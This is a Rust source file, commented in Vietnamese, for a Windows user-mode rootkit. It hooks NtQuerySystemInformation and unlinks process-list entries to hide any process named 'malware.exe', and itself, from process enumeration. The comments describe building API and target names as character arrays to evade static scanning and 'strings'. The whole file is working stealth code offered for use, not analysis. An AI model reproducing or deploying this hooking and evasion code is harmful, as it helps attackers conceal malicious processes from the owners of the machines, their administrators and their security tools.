use detour::static_detour;
use std::error::Error;
use std::ffi::CStr;
use std::mem;
use std::sync::atomic::{AtomicBool, Ordering};
use winapi::shared::minwindef::{DWORD, ULONG};
use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID, UNICODE_STRING, STRING};
use winapi::um::winnt::{ACCESS_MASK, PACCESS_MASK};
use winapi::shared::basetsd::{SIZE_T, ULONG_PTR};
use std::slice;

// Define function signature for NtQuerySystemInformation
type NtQuerySystemInformationFn = unsafe extern "system" fn(
    SystemInformationClass: u32,
    SystemInformation: PVOID,
    SystemInformationLength: ULONG,
    ReturnLength: *mut ULONG,
) -> NTSTATUS;

static_detour! {
    static NtQuerySystemInformationHook: NtQuerySystemInformationFn;
}

// SystemProcessInformation = 5
const SYSTEMS_PROCESS_INFORMATION: u32 = 5;

// Structure for SYSTEM_PROCESS_INFORMATION (simplified)
#[repr(C)]
struct SYSTEM_PROCESS_INFORMATION {
    NextEntryOffset: ULONG,
    NumberOfThreads: ULONG,
    WorkingSetPrivateSize: i64, 
    HardFaultCount: ULONG,
    NumberOfThreadsHighWatermark: ULONG,
    CycleTime: u64,
    CreateTime: i64,
    UserTime: i64,
    KernelTime: i64,
    ImageName: UNICODE_STRING,
    BasePriority: i32,
    UniqueProcessId: HANDLE,
    InheritedFromUniqueProcessId: HANDLE,
    HandleCount: ULONG,
    SessionId: ULONG,
    UniqueProcessKey: ULONG_PTR,
    PeakVirtualSize: SIZE_T,
    VirtualSize: SIZE_T,
    PageFaultCount: ULONG,
    PeakWorkingSetSize: SIZE_T,
    WorkingSetSize: SIZE_T,
    QuotaPeakPagedPoolUsage: SIZE_T,
    QuotaPagedPoolUsage: SIZE_T,
    QuotaPeakNonPagedPoolUsage: SIZE_T,
    QuotaNonPagedPoolUsage: SIZE_T,
    PagefileUsage: SIZE_T,
    PeakPagefileUsage: SIZE_T,
    PrivatePageCount: SIZE_T,
    ReadOperationCount: i64,
    WriteOperationCount: i64,
    OtherOperationCount: i64,
    ReadTransferCount: i64,
    WriteTransferCount: i64,
    OtherTransferCount: i64,
}

/// Kiểm tra xem Image Name có khớp với mục tiêu cần ẩn không
unsafe fn is_target_process(image_name: &UNICODE_STRING) -> bool {
    if image_name.Buffer.is_null() || image_name.Length == 0 {
        return false;
    }
    
    // Chuyển đổi con trỏ UTF-16 sang Slice để so sánh
    let name_slice = slice::from_raw_parts(
        image_name.Buffer, 
        (image_name.Length / 2) as usize
    );

    // Tên cần ẩn: "malware.exe" (Mã hóa dạng mảng u16 để tránh lộ String tĩnh)
    let target_name = [
        'm' as u16, 'a' as u16, 'l' as u16, 'w' as u16, 
        'a' as u16, 'r' as u16, 'e' as u16, '.' as u16, 
        'e' as u16, 'x' as u16, 'e' as u16
    ];

    // So sánh contains để bắt cả đường dẫn đầy đủ hoặc tên file
    if name_slice.len() >= target_name.len() {
        return name_slice.windows(target_name.len()).any(|window| window == target_name);
    }
    
    false
}

pub fn install_hooks() -> Result<(), Box<dyn Error>> {
    unsafe {
        // Kỹ thuật Stack String: Tránh bị detect bởi lệnh "strings" hoặc quét tĩnh
        // "ntdll.dll"
        let dll_name = [
            'n' as u8, 't' as u8, 'd' as u8, 'l' as u8, 
            'l' as u8, '.' as u8, 'd' as u8, 'l' as u8, 
            'l' as u8, 0
        ];
        
        // "NtQuerySystemInformation"
        let func_name = [
            'N' as u8, 't' as u8, 'Q' as u8, 'u' as u8, 'e' as u8, 'r' as u8, 'y' as u8, 
            'S' as u8, 'y' as u8, 's' as u8, 't' as u8, 'e' as u8, 'm' as u8, 
            'I' as u8, 'n' as u8, 'f' as u8, 'o' as u8, 'r' as u8, 'm' as u8, 'a' as u8, 
            't' as u8, 'i' as u8, 'o' as u8, 'n' as u8, 0
        ];

        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(dll_name.as_ptr() as *const i8);
        if ntdll.is_null() {
            return Err("Module not found".into());
        }

        let address = winapi::um::libloaderapi::GetProcAddress(
            ntdll,
            func_name.as_ptr() as *const i8,
        );
        if address.is_null() {
            return Err("Function not found".into());
        }

        let target: NtQuerySystemInformationFn = mem::transmute(address);

        NtQuerySystemInformationHook
            .initialize(target, nt_query_system_information_detour)?
            .enable()?;
    }
    Ok(())
}

fn get_current_process_id() -> u32 {
    unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() }
}

unsafe extern "system" fn nt_query_system_information_detour(
    system_information_class: u32,
    system_information: PVOID,
    system_information_length: ULONG,
    return_length: *mut ULONG,
) -> NTSTATUS {
    // Call original function first
    let status = NtQuerySystemInformationHook.call(
        system_information_class,
        system_information,
        system_information_length,
        return_length,
    );

    // Filter results if success and class is SystemProcessInformation
    if status == 0 && system_information_class == SYSTEMS_PROCESS_INFORMATION {
        let mut current_ptr = system_information as *mut SYSTEM_PROCESS_INFORMATION;
        let mut prev_ptr: *mut SYSTEM_PROCESS_INFORMATION = std::ptr::null_mut();

        loop {
            let current = &mut *current_ptr;
            
            // LOGIC MỚI: Kiểm tra tên thay vì chỉ PID
            // Nếu là target hoặc là chính PID của process này (để tự bảo vệ)
            let should_hide = is_target_process(&current.ImageName) 
                              || current.UniqueProcessId as usize == get_current_process_id() as usize;

            if should_hide {
                // UNLINK LOGIC (DKOM style in UserMode)
                if !prev_ptr.is_null() {
                    let prev = &mut *prev_ptr;
                    if current.NextEntryOffset == 0 {
                        // Nếu là node cuối, set node trước đó thành node cuối
                        prev.NextEntryOffset = 0;
                    } else {
                        // Nhảy cóc qua node hiện tại
                        prev.NextEntryOffset += current.NextEntryOffset;
                    }
                    // Quan trọng: Không cập nhật prev_ptr, giữ nguyên để check node tiếp theo
                    // (xử lý trường hợp có nhiều process cần ẩn nằm liền kề nhau)
                } else {
                    // Trường hợp node đầu tiên (hiếm gặp vì System Idle Process thường là đầu)
                    // Ở đây chúng ta giữ nguyên prev_ptr là null.
                }
            } else {
                // Nếu không ẩn, cập nhật prev_ptr
                prev_ptr = current_ptr;
            }

            if current.NextEntryOffset == 0 {
                break;
            }
            current_ptr = (current_ptr as *mut u8).add(current.NextEntryOffset as usize) as *mut SYSTEM_PROCESS_INFORMATION;
        }
    }

    status
}
